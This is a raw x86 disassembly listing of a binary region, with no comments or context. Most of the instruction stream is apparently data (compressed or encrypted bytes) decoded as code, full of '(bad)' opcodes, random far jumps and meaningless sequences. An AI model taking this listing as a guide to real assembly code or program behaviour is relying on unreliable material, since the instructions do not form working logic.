  42ad96:	sbb    ch,al
  42ad98:	dec    eax
  42ad99:	in     eax,0x7c
  42ad9b:	inc    eax
  42ad9c:	popf   
  42ad9d:	push   eax
  42ad9e:	lahf   
  42ad9f:	sbb    DWORD PTR [edi+0x5a99b08e],ebx
  42ada5:	xor    ah,BYTE PTR [edi]
  42ada7:	retf   
  42ada8:	jbe    0x42ad49
  42adaa:	xacquire xchg DWORD PTR [esp+ebx*4+0x2b877560],esp
  42adb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42adb3:	inc    ebp
  42adb4:	fsubr  DWORD PTR [esi+0x62650cd7]
  42adba:	pop    edi
  42adbb:	add    al,bh
  42adbd:	adc    al,0x35
  42adbf:	pop    eax
  42adc0:	aas    
  42adc1:	jbe    0x42adff
  42adc3:	pop    ebp
  42adc4:	push   es
  42adc5:	push   0xffffffb9
  42adc7:	imul   ebx,DWORD PTR [ebp+0x5e],0x7a
  42adcb:	and    al,0x19
  42adcd:	sbb    eax,0xc985593b
  42add2:	addr16 mov ebx,0xdc6c2f1b
  42add8:	dec    ebp
  42add9:	pop    ebx
  42adda:	int    0x9b
  42addc:	ins    BYTE PTR es:[di],dx
  42adde:	or     edx,ebx
  42ade0:	(bad)  
  42ade1:	arpl   WORD PTR [eax],si
  42ade3:	cli    
  42ade4:	inc    ebp
  42ade5:	in     eax,dx
  42ade6:	sbb    DWORD PTR [edi-0x1e],eax
  42ade9:	nop
  42adea:	adc    dh,ah
  42adec:	stc    
  42aded:	jecxz  0x42adac
  42adef:	cmp    DWORD PTR [ecx],esi
  42adf1:	aam    0x50
  42adf3:	cmp    BYTE PTR [edx+0x2c],bl
  42adf6:	push   esi
  42adf7:	(bad)  
  42adf8:	pusha  
  42adf9:	dec    edi
  42adfa:	push   ss
  42adfb:	fwait
  42adfc:	stos   BYTE PTR es:[edi],al
  42adfd:	test   DWORD PTR ds:0xf8b72e18,ebp
  42ae03:	mov    edi,0xa00491f6
  42ae08:	icebp  
  42ae09:	(bad)  [esi+eiz*1-0x14]
  42ae0d:	xchg   esi,eax
  42ae0e:	fidiv  DWORD PTR [esi-0x7a]
	...
  42ae71:	add    BYTE PTR [eax],al
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	scas   eax,DWORD PTR es:[edi]
  42ae81:	dec    ebx
  42ae82:	mov    DWORD PTR [edi+0x1cba5],ebp
  42ae88:	add    eax,0x62000001
  42ae8d:	jnp    0x42ae7c
  42ae8f:	aad    0x21
  42ae91:	xor    ecx,DWORD PTR [ebx]
  42ae93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ae94:	ins    BYTE PTR es:[edi],dx
  42ae95:	and    BYTE PTR ds:0xa10f084d,bh
  42ae9b:	icebp  
  42ae9c:	sbb    DWORD PTR [esi],esi
  42ae9e:	imul   BYTE PTR [eax]
  42aea0:	jmp    0x62e8564d
  42aea5:	or     BYTE PTR [esi+0x77],bl
  42aea8:	pop    ds
  42aea9:	ss push ebx
  42aeab:	push   es
  42aeac:	inc    ecx
  42aead:	push   cs
  42aeae:	or     eax,0x6de42b97
  42aeb3:	(bad)  
  42aeb4:	mov    dl,BYTE PTR [eax]
  42aeb6:	jmp    0x42aead
  42aeb8:	(bad)  
  42aeb9:	leave  
  42aeba:	mov    al,0xc7
  42aebc:	xor    ebx,esi
  42aebe:	cmp    al,0x8a
  42aec0:	jo     0x42ae8f
  42aec2:	icebp  
  42aec3:	imul   edx,DWORD PTR [esp+ebp*4],0x2fadf042
  42aeca:	fsub   DWORD PTR [ebx]
  42aecc:	xchg   edi,eax
  42aecd:	mov    dl,0x4a
  42aecf:	cmp    ebp,DWORD PTR [esi+eax*1]
  42aed2:	xchg   ebp,ebx
  42aed4:	sub    DWORD PTR [edi-0x282fb43a],esi
  42aeda:	mov    BYTE PTR [edi],dl
  42aedc:	outs   dx,DWORD PTR ds:[esi]
  42aedd:	sbb    edi,DWORD PTR [ecx+0x5]
  42aee0:	les    ebx,FWORD PTR [ebx-0x48]
  42aee3:	cdq    
  42aee4:	sub    BYTE PTR fs:[edx],bl
  42aee7:	jns    0x42aead
  42aee9:	jecxz  0x42aee8
  42aeeb:	or     esi,DWORD PTR [eax+0x27641f60]
  42aef1:	lds    ebx,FWORD PTR [ebp+0x74]
  42aef4:	push   edx
  42aef5:	pop    esp
  42aef6:	push   ds
  42aef7:	mov    ?,WORD PTR [ebp-0x7637beae]
  42aefd:	dec    esi
  42aefe:	jmp    0x8ef3:0x69fe9a0
  42af05:	outs   dx,DWORD PTR ds:[esi]
  42af06:	push   ds
  42af07:	push   ebx
  42af08:	loop   0x42af70
  42af0a:	adc    ebp,ecx
  42af0c:	adc    edi,DWORD PTR [eax+0x2abfe9d3]
  42af12:	ret    
  42af13:	jmp    0xb4918ef5
  42af18:	aas    
  42af19:	ds ret 0x7bd2
  42af1d:	ret    0xfed
  42af20:	pop    esi
  42af21:	push   ebx
  42af22:	adc    bh,BYTE PTR [eax+0x10]
  42af25:	cmc    
  42af26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af27:	(bad)  
  42af29:	pavgb  mm6,QWORD PTR [ebx-0x472e3f36]
  42af30:	nop    DWORD PTR [esi-0x2e]
  42af34:	int3   
  42af35:	pop    ecx
  42af36:	mov    al,ds:0x7276414b
  42af3b:	jno    0x42aeec
  42af3d:	ret    0xd19b
  42af40:	push   edi
  42af41:	jns    0x42afb3
  42af43:	and    eax,0x8a790345
  42af48:	mov    ds:0xcc76cbd,al
  42af4d:	xor    BYTE PTR [ecx+ebp*1+0x4],0x32
  42af52:	ret    0x322b
  42af55:	imul   edi,DWORD PTR [ecx+eax*8+0x765a53e5],0xa7109c36
  42af60:	leave  
  42af61:	fs mov dh,0xc5
  42af64:	xor    eax,0x4f72b173
  42af69:	adc    eax,0x8b5a16a1
  42af6e:	sbb    al,ch
  42af70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af71:	(bad)  
  42af72:	mov    al,0xfd
  42af74:	mov    al,BYTE PTR [edx]
  42af76:	jns    0x42af24
  42af78:	mov    edx,0x9ad05075
  42af7d:	scas   al,BYTE PTR es:[edi]
  42af7e:	xchg   edx,eax
  42af7f:	sbb    bl,dl
  42af81:	gs nop
  42af83:	mov    esi,0x2b56719d
  42af88:	scas   eax,DWORD PTR es:[edi]
  42af89:	in     al,0x61
  42af8b:	test   eax,0xf29c6c9e
  42af90:	add    eax,DWORD PTR [eax]
	...
  42aff2:	add    BYTE PTR [eax],al
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	hlt    
  42b001:	mov    edx,DWORD PTR [ecx+0x27]
  42b004:	stos   BYTE PTR es:[edi],al
  42b005:	int3   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    eax,0xb3000001
  42b00d:	int    0x8a
  42b00f:	xor    cl,BYTE PTR [ecx]
  42b011:	push   0xd5fc0e84
  42b016:	loop   0x42affd
  42b018:	pop    es
  42b019:	dec    ecx
  42b01a:	nop
  42b01b:	inc    esi
  42b01c:	sbb    al,0xf6
  42b01e:	cwde   
  42b01f:	push   esi
  42b020:	push   cs
  42b021:	inc    ebp
  42b022:	cmp    al,0x86
  42b024:	xor    ebx,DWORD PTR [ebp+0x688c05fc]
  42b02a:	pop    es
  42b02b:	paddd  mm7,mm1
  42b02e:	mov    edi,0x6b59b79e
  42b033:	pushf  
  42b034:	inc    ecx
  42b035:	and    eax,0x2f7f11c
  42b03a:	add    DWORD PTR [eax+0x42],ebx
  42b03d:	sub    ah,BYTE PTR [esi]
  42b03f:	or     eax,0x81e5ab30
  42b044:	fcmovu st,st(2)
  42b046:	mov    bl,0xee
  42b048:	repz (bad) 
  42b04a:	fnsave [eax]
  42b04c:	xchg   esi,ebp
  42b04e:	daa    
  42b04f:	or     eax,0x9747fd89
  42b054:	sub    eax,0xad12d010
  42b059:	les    ecx,FWORD PTR ds:0xcf53a7df
  42b05f:	pop    es
  42b060:	retf   
  42b061:	or     BYTE PTR [eax-0x65],dh
  42b064:	mov    al,ds:0xd35e6fb4
  42b069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b06a:	and    eax,0xec3f0224
  42b06f:	sub    BYTE PTR [edx+0x54818754],bl
  42b075:	add    dl,bl
  42b077:	mov    bl,0xc2
  42b079:	xor    edi,edx
  42b07b:	sub    al,0x1
  42b07d:	pop    ebp
  42b07e:	adc    edx,edx
  42b080:	ficomp WORD PTR [edx+0x466a592f]
  42b086:	cs scas al,BYTE PTR es:[edi]
  42b088:	dec    esi
  42b089:	(bad)  
  42b08a:	(bad)  
  42b08c:	je     0x42b10c
  42b08e:	xor    al,0x88
  42b090:	dec    esi
  42b091:	xlat   BYTE PTR ds:[ebx]
  42b092:	mov    dh,0x14
  42b094:	not    DWORD PTR [edx*8-0x466f2113]
  42b09b:	xchg   ebx,eax
  42b09c:	popf   
  42b09d:	shl    DWORD PTR [eax+0xc],cl
  42b0a0:	cmp    edi,DWORD PTR [ebp-0x4c4af384]
  42b0a6:	sbb    DWORD PTR [eax-0x49],esi
  42b0a9:	addr16 hlt 
  42b0ab:	cmp    al,0xc9
  42b0ad:	ins    BYTE PTR es:[edi],dx
  42b0ae:	adc    BYTE PTR [eax+0x33],bl
  42b0b1:	or     edi,DWORD PTR [ebp+0x634194db]
  42b0b7:	mov    dl,0x49
  42b0b9:	add    BYTE PTR cs:[eax+ebp*8],0xd3
  42b0be:	and    DWORD PTR [edx+0x43fc1887],edi
  42b0c4:	lods   al,BYTE PTR ds:[esi]
  42b0c5:	push   ds
  42b0c6:	xor    al,0x4
  42b0c8:	ror    ecx,cl
  42b0ca:	sbb    ebp,DWORD PTR [ebx]
  42b0cc:	arpl   WORD PTR [eax],cx
  42b0ce:	out    dx,al
  42b0cf:	inc    esi
  42b0d0:	xchg   DWORD PTR [eax],eax
  42b0d2:	sbb    ecx,esi
  42b0d4:	inc    ebp
  42b0d5:	push   esp
  42b0d6:	ret    0x7e16
  42b0d9:	out    0xa9,eax
  42b0db:	je     0x42b0e5
  42b0dd:	push   edx
  42b0de:	clc    
  42b0df:	mov    ecx,0x3f87688a
  42b0e4:	ins    DWORD PTR es:[edi],dx
  42b0e5:	xor    BYTE PTR [ebx-0x67],bh
  42b0e8:	and    al,0x13
  42b0ea:	cmp    DWORD PTR [si],edx
  42b0ed:	into   
  42b0ee:	cmp    ch,BYTE PTR [ebx+0x3b]
  42b0f1:	jmp    DWORD PTR [ebp-0x25]
  42b0f4:	pusha  
  42b0f5:	outs   dx,BYTE PTR ds:[esi]
  42b0f6:	iret   
  42b0f7:	or     BYTE PTR [esi],cl
  42b0f9:	jmp    0x16b8:0xa74cbec1
  42b100:	leave  
  42b101:	mov    ch,0xd8
  42b103:	jnp    0x42b0f8
  42b105:	sbb    ecx,DWORD PTR [eax+0x23]
  42b108:	jle    0x42b0d9
  42b10a:	stos   DWORD PTR es:[edi],eax
  42b10b:	cld    
  42b10c:	sahf   
  42b10d:	fsub   st,st(5)
  42b10f:	push   cs
  42b110:	ins    DWORD PTR es:[edi],dx
	...
  42b171:	add    BYTE PTR [eax],al
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	lods   eax,DWORD PTR ds:[esi]
  42b181:	push   0xcdafd301
  42b186:	add    DWORD PTR [eax],eax
  42b188:	add    eax,0x8000001
  42b18d:	popa   
  42b18e:	mov    ecx,0xec037c09
  42b193:	adc    al,0xb1
  42b195:	sub    BYTE PTR [eax+0x37f089f8],dl
  42b19b:	fstp   QWORD PTR ds:0x157fd020
  42b1a1:	imul   eax,DWORD PTR [edx-0x552b5d5f],0xda12b976
  42b1ab:	mov    eax,ds:0xd648a71b
  42b1b0:	fcmovnu st,st(0)
  42b1b2:	cmp    DWORD PTR es:[ecx+edx*1+0x6a7eb165],edi
  42b1ba:	cli    
  42b1bb:	pop    esi
  42b1bc:	dec    ebx
  42b1bd:	jne    0x42b145
  42b1bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1c0:	sbb    eax,0x10ea30b4
  42b1c5:	lahf   
  42b1c6:	sub    al,0xb5
  42b1c8:	test   eax,0x120b5cbe
  42b1cd:	jg     0x42b217
  42b1cf:	dec    esi
  42b1d0:	and    al,bh
  42b1d2:	pusha  
  42b1d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1d4:	fisub  WORD PTR [ecx+0xb]
  42b1d7:	or     al,BYTE PTR [ecx-0x22]
  42b1da:	dec    edx
  42b1db:	sub    al,0x1f
  42b1dd:	xchg   edx,eax
  42b1de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1df:	mov    ebx,0x22f8de3a
  42b1e4:	jp     0x42b251
  42b1e6:	aas    
  42b1e7:	add    al,0x2d
  42b1e9:	xor    ch,dh
  42b1eb:	mov    bh,0xf0
  42b1ed:	mov    dl,0x55
  42b1ef:	jno    0x42b25f
  42b1f1:	lahf   
  42b1f2:	cmp    al,0xad
  42b1f4:	shr    DWORD PTR [ecx+0x11b8d149],1
  42b1fa:	jg     0x42b191
  42b1fc:	fld    TBYTE PTR ds:0xa5427dfd
  42b202:	data16 add ch,BYTE PTR [eax-0x444dbb57]
  42b209:	mov    dh,BYTE PTR [esi+0x1d]
  42b20c:	cmp    al,0x3
  42b20e:	je     0x42b1b2
  42b210:	shr    DWORD PTR [ebp-0x7c429e09],cl
  42b216:	jle    0x42b20f
  42b218:	lds    ebx,FWORD PTR [esi-0x4e570502]
  42b21e:	ss xor edi,edx
  42b221:	pop    edi
  42b222:	loop   0x42b25c
  42b224:	scas   al,BYTE PTR es:[edi]
  42b225:	test   DWORD PTR [ebp-0x6c],edx
  42b228:	mov    esi,0x8b7ea167
  42b22d:	dec    BYTE PTR [edi]
  42b22f:	pop    edx
  42b230:	std    
  42b231:	sbb    esp,edx
  42b233:	pop    edx
  42b234:	loopne 0x42b226
  42b236:	sti    
  42b237:	mov    bh,0x76
  42b239:	adc    BYTE PTR [edi+0x7d],0xef
  42b23d:	push   ds
  42b23e:	nop
  42b23f:	lods   eax,DWORD PTR ds:[esi]
  42b240:	imul   ebp,DWORD PTR [ebx-0x6ba710fd],0xffffffc1
  42b247:	xor    BYTE PTR [ebx+0x437d327],bh
  42b24d:	add    BYTE PTR [esi-0x2a],ch
  42b250:	and    DWORD PTR ds:[esi+0x68c80603],edx
  42b257:	xchg   edx,eax
  42b258:	iret   
  42b259:	cld    
  42b25a:	push   ds
  42b25b:	inc    edi
  42b25c:	fistp  DWORD PTR [ecx-0x2a655a78]
  42b262:	int    0x4b
  42b264:	xchg   edx,eax
  42b265:	cmp    eax,0x7badd403
  42b26a:	and    al,0xbf
  42b26c:	add    eax,0x1f43aa2c
  42b271:	adc    eax,DWORD PTR [ecx-0x59]
  42b274:	cmp    BYTE PTR [ebp+0x28a5cef0],bh
  42b27a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b27b:	push   ecx
  42b27c:	not    DWORD PTR [eax-0x62d7d618]
  42b282:	mov    bh,0x4b
  42b284:	mov    dh,0x1c
  42b286:	mov    esp,edi
  42b288:	push   ecx
  42b289:	xor    bh,BYTE PTR [edi+0x6b7af7c8]
  42b28f:	into   
  42b290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0x26738e65
  42b301:	or     DWORD PTR [esi-0x46],ebp
  42b304:	mov    ah,0xce
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    eax,0xfc000001
  42b30d:	mov    bl,0xf1
  42b30f:	dec    esp
  42b310:	xchg   edi,eax
  42b311:	ds (bad) 
  42b313:	mov    edx,0xb982b4a8
  42b318:	daa    
  42b319:	hlt    
  42b31a:	jmp    0x42b2eb
  42b31c:	iret   
  42b31d:	lods   al,BYTE PTR ds:[esi]
  42b31e:	ss in  al,0xa3
  42b321:	lds    ebp,FWORD PTR [edi+0x4636bcf2]
  42b327:	push   ebp
  42b328:	push   0xffffffeb
  42b32a:	call   0x61d91d7f
  42b32f:	cmp    DWORD PTR [edi+0x73],eax
  42b332:	pop    esp
  42b333:	push   edx
  42b334:	loop   0x42b2ce
  42b336:	(bad)
  42b339:	ds mov dh,0xa
  42b33c:	popf   
  42b33d:	cs push edx
  42b33f:	mov    esi,0xdd8449d1
  42b344:	sbb    bl,BYTE PTR [edx]
  42b346:	jns    0x42b38d
  42b348:	pop    esp
  42b349:	fimul  WORD PTR [ebx]
  42b34b:	out    0x7f,al
  42b34d:	xor    BYTE PTR [ebx],dl
  42b34f:	xlat   BYTE PTR ds:[ebx]
  42b350:	bound  esp,QWORD PTR [ebx+0x2153901c]
  42b356:	retf   0xbd10
  42b359:	call   0xaa11:0x189af063
  42b360:	or     BYTE PTR [ecx],0xd6
  42b363:	inc    edx
  42b364:	pop    es
  42b365:	rcl    ch,cl
  42b367:	dec    ebp
  42b368:	or     eax,0xd137e0be
  42b36d:	bound  edx,QWORD PTR [ebx]
  42b36f:	xor    DWORD PTR [ebx-0x57977808],ebp
  42b375:	aam    0xd0
  42b377:	out    0xf5,eax
  42b379:	inc    ebx
  42b37a:	or     al,0xcc
  42b37c:	adc    bh,BYTE PTR [edx]
  42b37e:	xor    ebp,DWORD PTR [edi-0x5a5ed6de]
  42b384:	lock out 0xc1,al
  42b387:	jno    0x42b32d
  42b389:	xor    DWORD PTR [edx],0x1b
  42b38c:	and    bh,BYTE PTR [edx]
  42b38e:	jne    0x42b40b
  42b390:	dec    edi
  42b391:	jbe    0x42b314
  42b393:	mov    ds:0xa8ffbf05,eax
  42b398:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42b39a:	jecxz  0x42b39d
  42b39c:	(bad)  
  42b39d:	(bad)  
  42b39e:	mov    ebx,0x4d7a40a8
  42b3a3:	add    al,0x19
  42b3a5:	lock ss fcomip st,st(2)
  42b3a9:	lahf   
  42b3aa:	arpl   WORD PTR [edx-0x70eb1503],sp
  42b3b0:	push   edi
  42b3b1:	mov    esp,0xa6d3090e
  42b3b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b3b7:	(bad)  
  42b3b9:	pop    ebp
  42b3ba:	sbb    cl,BYTE PTR [eax]
  42b3bc:	sub    al,0xe5
  42b3be:	mov    ch,0x2b
  42b3c0:	inc    esp
  42b3c1:	mov    eax,DWORD PTR [ebp-0x6f]
  42b3c4:	loope  0x42b3e2
  42b3c6:	xor    eax,esp
  42b3c8:	push   esi
  42b3c9:	call   0xefd7:0xcf5d543d
  42b3d0:	and    ebx,edx
  42b3d2:	inc    ecx
  42b3d3:	data16 sahf 
  42b3d5:	xchg   ebp,eax
  42b3d6:	jmp    0x843c:0x573c2a34
  42b3dd:	in     al,0x2f
  42b3df:	pusha  
  42b3e0:	mov    edi,0x76151277
  42b3e5:	dec    BYTE PTR [edx]
  42b3e7:	pop    ecx
  42b3e8:	pop    ecx
  42b3e9:	lock pushw 0x18
  42b3ed:	(bad)  
  42b3ee:	in     al,0xe7
  42b3f0:	jbe    0x42b45b
  42b3f2:	cmp    BYTE PTR [edx+ebp*2-0x7f1bdad5],dl
  42b3f9:	inc    esi
  42b3fa:	sbb    BYTE PTR [esi-0x7e],ch
  42b3fd:	cmc    
  42b3fe:	mov    al,0xf
  42b400:	div    DWORD PTR [esi+eax*2]
  42b403:	inc    esi
  42b404:	or     al,0xc4
  42b406:	repz in al,0xe6
  42b409:	xchg   edx,eax
  42b40a:	or     eax,0xdca5df98
  42b40f:	mov    ds:0x7d,eax
	...
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [ebx-0x4698c57c],edi
  42b485:	iret   
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    eax,0x56000001
  42b48d:	dec    esi
  42b48e:	retf   
  42b48f:	inc    edi
  42b490:	fwait
  42b491:	ss ret 0x95bb
  42b495:	cmp    al,0x46
  42b497:	xor    ebp,DWORD PTR [edi]
  42b499:	mov    esp,0x7c9cbf62
  42b49e:	pop    ebx
  42b49f:	(bad)  
  42b4a0:	sub    esi,DWORD PTR [ebx+0x653c0076]
  42b4a6:	out    0xff,al
  42b4a8:	xor    al,0xb7
  42b4aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b4ab:	(bad)  
  42b4ac:	xor    edx,DWORD PTR [edx+esi*4-0x7dab8cf9]
  42b4b3:	in     eax,dx
  42b4b4:	dec    esi
  42b4b5:	dec    ecx
  42b4b6:	xor    ax,0x94b
  42b4ba:	mov    esi,0xe12f9218
  42b4bf:	jmp    0xdb91fc15
  42b4c4:	cld    
  42b4c5:	test   DWORD PTR [ebx+0x2a],edi
  42b4c8:	xor    al,0x59
  42b4ca:	inc    ebp
  42b4cb:	mov    eax,0xc35f8718
  42b4d0:	pop    es
  42b4d1:	(bad)  
  42b4d2:	or     eax,DWORD PTR [ebp+0x1a]
  42b4d5:	mov    edi,edi
  42b4d7:	fs jmp 0x42b4bc
  42b4da:	xor    al,0xad
  42b4dc:	adc    ebp,DWORD PTR [ecx]
  42b4de:	not    DWORD PTR [edi-0x52]
  42b4e1:	or     dl,BYTE PTR [ebp+0x6263192d]
  42b4e7:	cmp    esi,DWORD PTR [edx-0x12]
  42b4ea:	xor    ch,dh
  42b4ec:	call   0x3c14:0xe486b54
  42b4f3:	cwde   
  42b4f4:	jae    0x42b495
  42b4f6:	inc    edx
  42b4f7:	loop   0x42b49d
  42b4f9:	mov    ecx,0xb4700e19
  42b4fe:	imul   eax,edx,0xfea8042d
  42b504:	nop
  42b505:	stc    
  42b506:	or     cl,BYTE PTR [esi]
  42b508:	lods   eax,DWORD PTR ds:[esi]
  42b509:	loope  0x42b529
  42b50b:	pusha  
  42b50c:	push   ebx
  42b50d:	adc    eax,0xdf4c21cc
  42b512:	xchg   edx,eax
  42b513:	cmp    BYTE PTR [ebp-0x72d04f87],ah
  42b519:	or     eax,ecx
  42b51b:	scas   al,BYTE PTR es:[edi]
  42b51c:	hlt    
  42b51d:	int    0xe9
  42b51f:	adc    al,0x3b
  42b521:	inc    eax
  42b522:	adc    eax,DWORD PTR [edx-0x2da2a34f]
  42b528:	inc    ebp
  42b529:	nop
  42b52a:	pop    edx
  42b52b:	dec    esp
  42b52d:	jle    0x42b578
  42b52f:	es clc 
  42b531:	add    bl,BYTE PTR [ebx-0x376fe274]
  42b537:	and    bl,BYTE PTR [ecx+edi*1+0x20e3635e]
  42b53e:	stc    
  42b53f:	(bad)  
  42b540:	lea    edi,[edx-0x9bde4b7]
  42b546:	daa    
  42b547:	xchg   esp,eax
  42b548:	inc    edx
  42b549:	sub    edx,DWORD PTR [ecx]
  42b54b:	aas    
  42b54c:	fisub  DWORD PTR [edi+0xf43f610]
  42b552:	repz sahf 
  42b554:	mov    ah,0xe
  42b556:	xchg   edi,eax
  42b557:	into   
  42b558:	sub    dl,BYTE PTR [edi-0x2408a739]
  42b55e:	pop    ss
  42b55f:	jge    0x42b5c2
  42b561:	lea    eax,[ecx+0x17]
  42b564:	enter  0x390,0xfd
  42b568:	icebp  
  42b569:	mov    esp,0x177be247
  42b56e:	das    
  42b56f:	(bad)  
  42b570:	lock mov DWORD PTR [eax],ecx
  42b573:	das    
  42b574:	inc    esp
  42b575:	adc    edi,DWORD PTR [ebp+0x6d]
  42b578:	adc    BYTE PTR [edx+0x53],al
  42b57b:	call   0xbd6c9462
  42b580:	mov    eax,ds:0xe5de7b9e
  42b585:	rol    BYTE PTR [edx+edx*4+0x22],0xce
  42b58a:	pop    esp
  42b58b:	sar    BYTE PTR [edx],1
  42b58d:	fwait
  42b58e:	stos   DWORD PTR es:[edi],eax
  42b58f:	xchg   BYTE PTR [eax+eax*1],al
	...
  42b5f2:	add    BYTE PTR [eax],al
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	push   edx
  42b601:	push   ecx
  42b602:	daa    
  42b603:	cmp    edi,DWORD PTR [esi+0x50001d0]
  42b609:	add    DWORD PTR [eax],eax
  42b60b:	add    BYTE PTR [eax-0x6e7bdefe],cl
  42b611:	jae    0x42b5d7
  42b613:	sbb    BYTE PTR [ebx+0x1c883f31],bh
  42b619:	fwait
  42b61a:	std    
  42b61b:	push   ebp
  42b61c:	pop    edi
  42b61d:	mov    edi,0x8faa6a5e
  42b622:	inc    eax
  42b623:	inc    esi
  42b624:	jmp    0xf79e:0x8af6efe3
  42b62b:	shr    DWORD PTR [edi],cl
  42b62d:	xchg   ebx,eax
  42b62e:	mov    ebp,0x72bdbc1
  42b633:	loop   0x42b621
  42b635:	mov    edx,0x531091eb
  42b63a:	inc    ecx
  42b63b:	clc    
  42b63c:	push   esp
  42b63d:	inc    eax
  42b63e:	push   ebx
  42b63f:	lahf   
  42b640:	mov    ds:0x4d970320,al
  42b645:	out    dx,eax
  42b646:	jne    0x42b611
  42b648:	sbb    al,0x80
  42b64a:	shl    DWORD PTR [ebx-0x6f8cf927],1
  42b650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b651:	(bad)  
  42b652:	popa   
  42b653:	int    0x42
  42b655:	add    eax,0xbb1860db
  42b65a:	or     BYTE PTR [ebp-0x73],dh
  42b65d:	inc    edx
  42b65e:	ret    
  42b65f:	or     ch,BYTE PTR [edx+0x14]
  42b662:	adc    DWORD PTR [edx],esp
  42b664:	mov    esp,?
  42b666:	add    cl,BYTE PTR [edx+0x11ab2df1]
  42b66c:	mov    bl,0x60
  42b66e:	les    esi,FWORD PTR [ebp+0x31]
  42b671:	adc    DWORD PTR [eax+0x60281a88],esi
  42b677:	mul    DWORD PTR [edx+0x69523cfc]
  42b67d:	lods   al,BYTE PTR ds:[esi]
  42b67e:	mov    fs,WORD PTR [ecx-0x18ad3634]
  42b684:	cli    
  42b685:	push   ss
  42b686:	pop    ds
  42b687:	sbb    DWORD PTR [ecx+ebx*1-0x4acedeca],ebp
  42b68e:	js     0x42b65f
  42b690:	jmp    0x5a62d30d
  42b695:	or     al,0x22
  42b697:	test   al,0x7f
  42b699:	iret   
  42b69a:	adc    ecx,ebp
  42b69c:	stc    
  42b69d:	pop    ebp
  42b69e:	fwait
  42b69f:	cld    
  42b6a0:	ret    
  42b6a1:	jns    0x42b6ee
  42b6a3:	mov    edi,0xfe918693
  42b6a8:	fstp   DWORD PTR [edx+eax*4]
  42b6ab:	loope  0x42b6c0
  42b6ad:	cdq    
  42b6ae:	les    esi,FWORD PTR [edi-0x550db8e4]
  42b6b4:	xchg   ecx,eax
  42b6b5:	jl     0x42b6c5
  42b6b7:	jnp    0x42b6a6
  42b6b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6ba:	push   eax
  42b6bb:	clc    
  42b6bc:	inc    ecx
  42b6bd:	and    esi,edi
  42b6bf:	sbb    eax,0x9665a7cf
  42b6c4:	jb     0x42b6b7
  42b6c6:	mov    al,ds:0x147c2e92
  42b6cb:	mov    WORD PTR ds:0x2b2a9e01,?
  42b6d1:	es pop eax
  42b6d3:	sub    al,0x10
  42b6d5:	in     al,0x4c
  42b6d7:	mov    bl,0xdc
  42b6d9:	xchg   ecx,eax
  42b6da:	push   0xffffffaf
  42b6dc:	cld    
  42b6dd:	dec    ebx
  42b6de:	jmp    0x42b70c
  42b6e0:	out    0x95,eax
  42b6e2:	xor    BYTE PTR [ebx+0x77],al
  42b6e5:	pop    ds
  42b6e6:	call   0xb21c8f54
  42b6eb:	xchg   esp,eax
  42b6ec:	pxor   mm2,mm0
  42b6ef:	push   edx
  42b6f0:	icebp  
  42b6f1:	mov    bp,0x5d1a
  42b6f5:	ins    BYTE PTR es:[edi],dx
  42b6f6:	mov    al,0x6a
  42b6f8:	or     BYTE PTR [eax-0x63],dh
  42b6fb:	neg    BYTE PTR [edi]
  42b6fd:	nop
  42b6fe:	and    al,0xed
  42b700:	push   0xffffffa1
  42b702:	add    bl,ch
  42b704:	cld    
  42b705:	pop    eax
  42b706:	or     eax,0x776940e9
  42b70b:	icebp  
  42b70c:	xchg   ebp,eax
  42b70d:	or     DWORD PTR [edx],ebp
  42b70f:	dec    eax
  42b710:	add    DWORD PTR [eax],eax
	...
  42b772:	add    BYTE PTR [eax],al
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	add    ebx,DWORD PTR [ebp-0x2e3c8563]
  42b786:	add    DWORD PTR [eax],eax
  42b788:	add    eax,0x81000001
  42b78d:	cmc    
  42b78e:	mov    dh,0xea
  42b790:	sub    eax,0x874e5e3f
  42b795:	call   0x5770:0x186292bb
  42b79c:	dec    ebx
  42b79d:	mov    cl,0x48
  42b79f:	std    
  42b7a0:	cmp    cl,cl
